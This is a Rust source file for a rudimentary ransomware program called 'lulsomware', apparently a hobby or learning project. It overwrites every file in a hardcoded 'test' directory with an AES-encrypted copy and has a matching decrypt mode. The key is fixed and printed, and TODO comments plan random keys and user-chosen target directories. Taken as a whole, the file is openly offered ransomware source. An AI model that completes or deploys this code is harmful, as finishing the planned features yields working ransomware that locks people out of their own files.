extern crate bincode_aes;

use std::fs::{read_dir, OpenOptions};
use std::io::{Read, Write, Seek, SeekFrom};
use std::{str, env};
use std::error::Error;
use bincode_aes::BincodeCryptor;
use std::process::exit;


fn main() {
    println!("Encrypt: lulsomware.exe encrypt [directory]");
    println!("Decrypt: lulsomware.exe decrypt [directory] [key]");
    let args: Vec<String> = env::args().collect();

    let human_readable_encryption_key = "abcdefghijklmnopqrstuvwxyz012345";
    let key = bincode_aes::create_key(human_readable_encryption_key.as_bytes().to_vec()).unwrap();
    let crypt = bincode_aes::with_key(key);

    if args.len() < 2 {
        eprintln!("You didn't specify what do you want to do!");
        exit(1);
    }

    println!("Save this key: {}", human_readable_encryption_key);

    // TODO: allow specifying working directory
    // TODO: better handling of args
    // TODO: test with non-text files (images, binaries, etc) - Optional
    // TODO: allow specifying an encryption key, and default to a random one
    if args[1].as_str() == "encrypt" {
        encrypt_all(&crypt);
    } else if args[1].as_str() == "decrypt" {
        let _key = args[2].as_str();
        println!("Debug [key] -> {}", _key);
        decrypt_all(&crypt);
    }
}

fn encrypt_all(crypt: &BincodeCryptor) {
    let directory_entries = read_dir("test").expect("Can't read");

    for entry in directory_entries {
        let path = entry.unwrap().path();
        let mut file = OpenOptions::new().read(true).write(true).open(path.as_os_str()).unwrap();
        let mut contents = vec![];
        file.read_to_end(&mut contents).unwrap();
        println!("-> Encoding {:?}", str::from_utf8_mut(contents.as_mut_slice()).unwrap());

        let encoded = crypt.serialize(&contents).unwrap();
        println!("<- Encoded as: {}", String::from_utf8_lossy(encoded.as_slice()));

        file.seek(SeekFrom::Start(0)).unwrap();
        file.write_all(&mut encoded.as_slice()).unwrap();
    }
}

fn decrypt_all(crypt: &BincodeCryptor) {
    let directory_entries = read_dir("test").expect("Can't read");

    for entry in directory_entries {
        let path = entry.unwrap().path();
        let mut file = OpenOptions::new().read(true).write(true).open(path.as_os_str()).unwrap();
        let mut buffer = vec![];
        file.read_to_end(&mut buffer).unwrap();
        println!("-> Encoded: {}", String::from_utf8_lossy(buffer.as_slice()));


        let decrypted: Result<String, Box<dyn Error>> = crypt.deserialize(&mut buffer);
        match decrypted {
            Ok(original_content) => {
                println!("<- Decoded as: {:?}", original_content);
                file.set_len(0).unwrap();
                file.seek(SeekFrom::Start(0)).unwrap();
                file.write_all(&mut original_content.as_bytes()).unwrap();
            }
            Err(e) => eprintln!("OH FUCK FUCK FUCK FUCK: {:?}", e),
        }
    }
}
